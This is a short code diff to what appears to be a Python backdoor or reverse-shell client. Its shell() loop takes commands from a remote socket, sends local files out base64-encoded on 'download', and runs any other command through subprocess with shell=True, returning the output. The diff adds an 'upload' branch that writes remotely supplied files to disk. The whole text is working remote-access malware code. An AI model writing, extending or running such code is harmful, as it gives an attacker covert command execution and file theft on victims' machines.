@@ -20,6 +20,10 @@ def shell():
         elif res[:8] == "download":
             with open(res[9:], 'rb') as file_download:
                 cliente.send(base64.b64encode(file_download.read()))
+        elif res[:6] == "upload":
+            with open(res[7:], 'wb') as file_upload:
+                datos = cliente.recv(300000)
+                file_upload.write(base64.b64decode(datos))
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
